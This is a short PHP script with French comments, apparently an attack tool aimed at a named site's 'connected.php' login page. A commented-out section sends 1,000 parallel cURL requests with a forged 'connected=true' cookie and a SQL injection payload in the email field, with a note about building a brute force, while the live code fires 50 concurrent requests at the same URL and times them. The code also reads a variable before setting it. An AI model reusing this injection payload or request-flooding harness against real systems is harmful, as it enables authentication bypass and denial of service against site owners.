<?php

// /!\ manager les erreurs que peut créer le nombre excessif de socket cURL
/*
$time_start = microtime(true);

$chs = array();
for ($i = 0; $i < 1000; $i++) {
    // bouclage futur sur la construction du bruteforce
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://esidcf.alwaysdata.net/connected.php");
    curl_setopt($ch, CURLOPT_COOKIE, "connected=true; email=' OR '' = '");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLINFO_HEADER_OUT, true);
    // ajouter le handler dans un array :
    array_push($chs, $ch);
}
// Création du gestionnaire multiple cURL
$mh = curl_multi_init();

foreach ($chs as $ch) {
    curl_multi_add_handle($mh, $ch);
}

$active = null;
// Exécute le gestionnaire
do {
    $mrc = curl_multi_exec($mh, $active);
} while ($mrc == CURLM_CALL_MULTI_PERFORM);
while ($active && $mrc == CURLM_OK) {
    if (curl_multi_select($mh) != -1) { // fix windows
        usleep(100);
    }
    do {
        $mrc = curl_multi_exec($mh, $active);
    } while ($mrc == CURLM_CALL_MULTI_PERFORM);
}
// Ferme les gestionnaires
foreach ($chs as $ch) {
    $html = curl_multi_getcontent($ch);
    //var_dump(curl_getinfo($ch));
    //echo $html;
    curl_multi_remove_handle($mh, $ch);
}
curl_multi_close($mh);
echo 'Total execution time in seconds: ' . (microtime(true) - $time_start);
*/

function rolling_curl($urls, $custom_options = null) {

    // make sure the rolling window isn't greater than the # of urls
    //$rolling_window = 100;
    $rolling_window = (sizeof($urls) < $rolling_window) ? sizeof($urls) : $rolling_window;

    $master = curl_multi_init();
    $curl_arr = array();

    // add additional curl options here
    $std_options = array(CURLOPT_RETURNTRANSFER => true,
    CURLOPT_FOLLOWLOCATION => true);
    $options = ($custom_options) ? ($std_options + $custom_options) : $std_options;

    // start the first batch of requests
    for ($i = 0; $i < $rolling_window; $i++) {
        $ch = curl_init();
        $options[CURLOPT_URL] = $urls[$i];
        curl_setopt_array($ch,$options);
        curl_multi_add_handle($master, $ch);
    }

    do {
        while(($execrun = curl_multi_exec($master, $running)) == CURLM_CALL_MULTI_PERFORM);
        if($execrun != CURLM_OK)
            break;
        // a request was just completed -- find out which one
        while($done = curl_multi_info_read($master)) {
            $info = curl_getinfo($done['handle']);
            if ($info['http_code'] == 200)  {
                $output = curl_multi_getcontent($done['handle']);
                // request successful.  process output using the callback function.
                //$callback($output);

                // start a new request (it's important to do this before removing the old one)
                if($i < sizeof($urls)){
                    $ch = curl_init();
                    $options[CURLOPT_URL] = $urls[$i++];  // increment i
                    curl_setopt_array($ch,$options);
                    curl_multi_add_handle($master, $ch);
                }
                // remove the curl handle that just completed
                curl_multi_remove_handle($master, $done['handle']);
            } else {
                // request failed.  add error handling.
            }
        }
    } while ($running);
    
    curl_multi_close($master);
    return true;
}
$array = Array();
for($i=0; $i<50; $i++){
    $array[$i] = "http://esidcf.alwaysdata.net/connected.php";
}
$time_start = microtime(true);
rolling_curl($array);
echo 'Total execution time in seconds: ' . (microtime(true) - $time_start);